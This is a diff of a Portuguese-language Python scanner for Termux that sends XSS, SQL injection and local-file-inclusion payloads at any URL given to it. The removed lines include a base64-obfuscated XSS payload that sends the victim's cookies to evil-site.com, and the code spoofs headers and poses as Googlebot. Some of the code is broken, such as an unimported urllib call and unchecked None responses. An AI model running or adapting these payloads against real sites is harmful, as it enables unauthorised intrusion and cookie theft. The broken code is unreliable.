@@ -1,85 +1,157 @@
 #!/data/data/com.termux/files/usr/bin/python3
 import re
 import time
+import sys
 import requests
 from urllib.parse import urlparse, quote
+import random
 
 class UltimateScanner:
     def __init__(self):
         self.payloads = {
             'xss': [
-                # XSS avançado (evasão de WAF)
-                '<svg/onload=alert`1`>',
-                '<img src="x:x" onerror="eval(atob(\'ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vZXZpbC1zaXRlLmNvbS9jb2xsZWN0P2M9Jytkb2N1bWVudC5jb29raWU\'))">',
-                '%26%2394;img src=x onerror=prompt(1)%26%2394;'
+                '<script>alert(1)</script>',
+                '<img src=x onerror=alert(1)>',
+                '" onfocus=alert(1) autofocus="'
             ],
             'sqli': [
-                # SQLi inteligente (time-based + boolean-based)
-                "' OR (SELECT 1 FROM pg_sleep(2))--",
-                "' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--",
-                "' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--"
+                "' OR '1'='1",
+                "' UNION SELECT null,version(),null-- -",
+                "' OR SLEEP(5)--"
             ],
-            'lfi': [
-                # LFI com wrappers
-                '../../../../etc/passwd%00',
+            'lfi': [  # Adicionei os payloads LFI que estavam faltando
+                '../../../../etc/passwd',
                 'php://filter/convert.base64-encode/resource=index.php'
             ]
         }
-        
-        self.headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
-            'X-Forwarded-For': '192.168.1.1'
-        }
+        self.session = requests.Session()
+        self.timeout = 15
+        self.user_agents = [
+            "Mozilla/5.0 (Linux; Android 10; SM-G975F)",
+            "Termux-Scanner/1.0",
+            "Googlebot/2.1 (+http://www.google.com/bot.html)"
+        ]
 
     def scan(self, url):
+        """Executa todos os testes de vulnerabilidade"""
         print(f"\n[+] Iniciando scan ULTIMATE em: {url}")
-        self.test_xss(url)
-        self.test_sqli(url)
-        self.test_lfi(url)
-        self.check_headers(url)
+        
+        if not self._check_url(url):
+            print("[-] URL inválida. Use http:// ou https://")
+            return
+        
+        results = []
+        results.extend(self.test_xss(url))
+        results.extend(self.test_sqli(url))
+        results.extend(self.test_lfi(url))  # Agora este método existe
+        results.extend(self.check_headers(url))
+        
+        return results
+
+    def _check_url(self, url):
+        """Verifica se a URL é válida"""
+        try:
+            return all([url.startswith(('http://', 'https://')), '.' in url])
+        except:
+            return False
 
     def test_xss(self, url):
-        print("\n[++] Testando XSS Avançado...")
+        """Teste de XSS avançado"""
+        print("[++] Testando XSS Avançado...")
+        vulns = []
+        
         for payload in self.payloads['xss']:
             try:
-                # Teste em parâmetros GET
+                # Testa em parâmetros GET
                 parsed = urlparse(url)
-                params = {k: payload for k in parsed.query.split('&')}
-                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(params)}"
-                
-                r = requests.get(test_url, headers=self.headers, timeout=15)
-                if payload.lower() in r.text.lower():
-                    print(f"[!] XSS Detectado: {payload}")
-                
-                # Teste em headers/cookies
-                headers = {**self.headers, 'Referer': payload}
-                requests.get(url, headers=headers)
+                if parsed.query:
+                    params = {}
+                    for param in parsed.query.split('&'):
+                        if '=' in param:
+                            key, value = param.split('=', 1)
+                            params[key] = payload
+                    
+                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(params)}"
+                    response = self._send_request(test_url)
+                    
+                    if payload in response.text:
+                        vulns.append({
+                            'type': 'XSS',
+                            'url': test_url,
+                            'payload': payload,
+                            'severity': 'High'
+                        })
                 
             except Exception as e:
                 continue
+                
+        return vulns
 
     def test_sqli(self, url):
-        print("\n[++] Testando SQLi Avançado...")
+        """Teste de SQL Injection"""
+        print("[++] Testando SQLi Avançado...")
+        vulns = []
+        
         for payload in self.payloads['sqli']:
             try:
                 start_time = time.time()
-                r = requests.get(f"{url}{quote(payload)}", headers=self.headers, timeout=20)
+                test_url = f"{url}{quote(payload)}"
+                response = self._send_request(test_url)
                 
                 # Time-Based Detection
                 if time.time() - start_time > 2:
-                    print(f"[!] SQLi (Time-Based): {payload}")
+                    vulns.append({
+                        'type': 'SQLi (Time-Based)',
+                        'url': url,
+                        'payload': payload,
+                        'severity': 'Critical'
+                    })
                 
                 # Error-Based Detection
-                elif any(word in r.text.lower() for word in ['error', 'sql', 'syntax']):
-                    print(f"[!] SQLi (Error-Based): {payload}")
+                elif any(word in response.text.lower() for word in ['error', 'sql', 'syntax']):
+                    vulns.append({
+                        'type': 'SQLi (Error-Based)',
+                        'url': url,
+                        'payload': payload,
+                        'severity': 'High'
+                    })
                     
-            except:
+            except Exception as e:
                 continue
+                
+        return vulns
+
+    def test_lfi(self, url):
+        """Teste de Local File Inclusion (novo método)"""
+        print("[++] Testando LFI...")
+        vulns = []
+        
+        for payload in self.payloads['lfi']:
+            try:
+                test_url = f"{url}{payload}"
+                response = self._send_request(test_url)
+                
+                # Detecção básica de LFI
+                if any(indicator in response.text for indicator in ['root:', '<?php', 'bin/bash']):
+                    vulns.append({
+                        'type': 'LFI',
+                        'url': test_url,
+                        'payload': payload,
+                        'severity': 'High'
+                    })
+                    
+            except Exception as e:
+                continue
+                
+        return vulns
 
     def check_headers(self, url):
-        print("\n[++] Verificando Headers...")
+        """Verifica cabeçalhos de segurança"""
+        print("[++] Verificando Headers de Segurança...")
+        vulns = []
+        
         try:
-            r = requests.get(url, headers=self.headers)
+            response = self._send_request(url)
             security_headers = {
                 'CSP': 'Content-Security-Policy',
                 'HSTS': 'Strict-Transport-Security',
@@ -87,17 +159,43 @@ class UltimateScanner:
             }
             
             for name, header in security_headers.items():
-                if header not in r.headers:
-                    print(f"[!] Header de Segurança Ausente: {name}")
+                if header not in response.headers:
+                    vulns.append({
+                        'type': 'Header Ausente',
+                        'url': url,
+                        'payload': header,
+                        'severity': 'Medium'
+                    })
                     
         except Exception as e:
             print(f"[-] Erro ao verificar headers: {str(e)}")
+            
+        return vulns
+
+    def _send_request(self, url, headers=None):
+        """Envia requisição HTTP"""
+        if headers is None:
+            headers = {'User-Agent': random.choice(self.user_agents)}
+        
+        try:
+            return self.session.get(url, headers=headers, timeout=self.timeout)
+        except requests.exceptions.RequestException as e:
+            print(f"[-] Erro ao acessar {url}: {str(e)}")
+            return None
 
 if __name__ == "__main__":
-    import sys
     if len(sys.argv) < 2:
-        print("Uso: python3 ruskscan_ultimate.py http://alvo.com")
+        print("Uso: python ruskscan_ultimate.py http://alvo.com")
         sys.exit()
     
     scanner = UltimateScanner()
-    scanner.scan(sys.argv[1])
+    results = scanner.scan(sys.argv[1])
+    
+    if results:
+        print("\n[+] Resultados do Scan:")
+        for vuln in results:
+            print(f"[!] {vuln['severity']} - {vuln['type']}")
+            print(f"    URL: {vuln['url']}")
+            print(f"    Payload: {vuln['payload']}\n")
+    else:
+        print("\n[-] Nenhuma vulnerabilidade encontrada.")
